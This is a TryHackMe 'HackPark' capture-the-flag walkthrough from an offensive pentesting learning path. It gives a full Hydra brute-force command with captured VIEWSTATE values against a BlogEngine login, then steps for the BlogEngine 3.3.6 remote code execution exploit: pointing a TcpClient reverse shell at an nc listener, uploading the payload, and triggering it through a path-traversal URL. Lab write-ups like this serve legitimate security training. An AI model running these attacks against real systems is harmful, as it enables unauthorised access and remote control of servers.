# THM-HackPark
https://tryhackme.com/room/hackpark

I did this as a part of the Offensive Pentesting Learning Path

## Task 1
### Whats the name of the clown displayed on the homepage?
Open the ip adress in a browser.<br>
Download the image of the clown and use Google to serch for that image.

## Task 2
### What request type is the Windows website login form using?
Use Developer Tools and Network Display to see what type of request the form is making.

### Guess a username, choose a password wordlist and gain credentials to a user account!
The server is using Blog Engine, and the default can be found on [there server](https://blogengine.io)<br>
Now use Burp Suite to se what´s sent during logon to http://IP.ad.dr.es/admin<br>
All new for me was the VIEWSTATE= part used during login.<br>
Copy VIEWSTATE and make a Hydra password attack command<br>
I used:<br>
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.19.178 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=97hlUt22e85aQD6CzwY82BVD9mqEeUj7nT8LT5JU%2B%2BHqmx9hzpOsGUGR91TmR1nxGBEc%2BXbGEY5jnb9IKCpEz3Bglz1KZRTTKnK3CGBpxgvWG5XvUReWcC4sWXOKtf8%2BLnAVFpfWtjjuSo%2B2xtGjDmeM1dYU1jcO4yYRw9viAzEkYuYj&__EVENTVALIDATION=BrCmhMtOml%2FrMjoO4%2F6vd%2FMu2F494JfLYNvR4pgYfFAnV4tn53%2FQCuTdGS3fLwNE%2F1IPWuy1PeHKg2N1AUtiYffQYrtYHZoRLEYUsCj9PnBUB7yLFz8JOV6qIyYJVALgjx8rWK7eXPE9fFkUWC6NeNdq322T%2B6G8dezO855lYGCZFepG&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -vv

(hydra -l user -P wordlist IP_ADDR http-post-form-type login-URI-and-return-Url "VIEWSTATE" modify UserName=^USER^ and Password=^PASS^, end with "error command" and -vv (verbose))

login: admin   password: 1qa*****

## Task 3
### Now you have logged into the website, are you able to identify the version of the BlogEngine?
Login to the admin panel and click About to find the version.
### What is the CVE?
Search for BlogEngine 3.3.6 using Exploit-db<br>
Look for a Remote Code Execution
###Using the public exploit, gain initial access to the server.
Download the exploit and save it as PostView.ascx.<br>
Change System.Net.Sockets.TcpClient("10.10.10.20", 4445) to mach the IP & Port you use in NC.
Run nc -lvnp 4445 on you attackbox<br>
Upload the PostView.ascx-file to the blog by opening a blog entry, click the foder icon and upload the file.<br>
Then run the exploit by accessing this url: http://IP_ADDR/?theme=../../App_Data/files<br>
Now there should be a connection to you nc.

### Who is the webserver running as?
run whoami in the reverse shell console

